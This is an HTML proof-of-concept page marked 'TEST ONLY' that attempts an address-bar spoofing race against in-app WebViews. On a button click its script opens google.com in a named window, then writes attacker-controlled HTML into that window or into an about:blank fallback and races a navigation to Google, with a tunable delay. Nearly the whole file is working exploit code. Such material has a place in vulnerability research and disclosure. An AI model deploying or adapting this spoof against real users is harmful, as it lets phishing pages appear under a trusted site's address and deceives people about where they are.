<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>PoC — Address Bar Race (TEST ONLY)</title>
  <style>
    html,body{height:100%;margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial}
    .wrap{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:18px;background:#fff;padding:24px}
    button{padding:12px 18px;border-radius:10px;border:0;background:#0b66ff;color:#fff;font-size:16px;cursor:pointer}
    h1{font-size:28px;color:#111;margin:0}
    .note{font-size:13px;color:#666}
  </style>
</head>
<body>
  <div class="wrap">
    <button id="runBtn">Run PoC (TEST ONLY) — Click once</button>
    <h1>This is not Google!</h1>
    <div class="note">Run only in your test environment (in-app WebView). The button provides the required user gesture.</div>
  </div>

<script>
/*
  PoC trigger: on click, attempt race flows that have shown address-bar spoof in some WebView targets.
  Adjust openDelay if you want to experiment (20..500ms).
  Run only in test environment.
*/
document.getElementById('runBtn').addEventListener('click', function runPoC(e){
  // disable button after first click
  const btn = e.currentTarget;
  btn.disabled = true;
  btn.textContent = 'Running…';

  const openDelay = 300; // ms — tweak when testing
  const target = 'https://www.google.com/';
  const attackerHtml = '<!doctype html><meta charset="utf-8"><title>Not Google</title><style>body{font-family:system-ui;padding:32px}</style><h1>This is not Google!</h1>';

  try {
    // Attempt flow A: open google in named window then attempt to write attacker content afterwards
    const w = window.open(target, 'x');
    if (!w) {
      console.warn('popup blocked or returned null');
      btn.textContent = 'Popup blocked — enable popups';
      btn.disabled = false;
      return;
    }

    setTimeout(() => {
      try {
        // Attempt to inject into same window (may throw on cross-origin)
        w.document.open();
        w.document.write(attackerHtml);
        w.document.close();
        console.log('Injection attempted via reuse named window.');
      } catch (err) {
        console.warn('Injection blocked; trying about:blank fallback', err);
        try {
          // Fallback: open about:blank in same window name, write, then navigate to target
          const w2 = window.open('about:blank', 'x');
          if (!w2) {
            console.warn('about:blank open blocked');
            return;
          }
          w2.document.open();
          w2.document.write(attackerHtml);
          w2.document.close();
          // create a short race by navigating to target after tiny delay
          setTimeout(() => {
            try { w2.location.href = target; } catch(e){ console.warn('navigate blocked', e); }
          }, 50);
        } catch(e2){
          console.warn('about:blank fallback failed', e2);
        }
      } finally {
        btn.textContent = 'Done (check popup)';
        btn.disabled = false;
      }
    }, openDelay);
  } catch (ex) {
    console.warn('Unexpected error', ex);
    btn.textContent = 'Error';
    btn.disabled = false;
  }
}, { once: true });
</script>
</body>
</html>
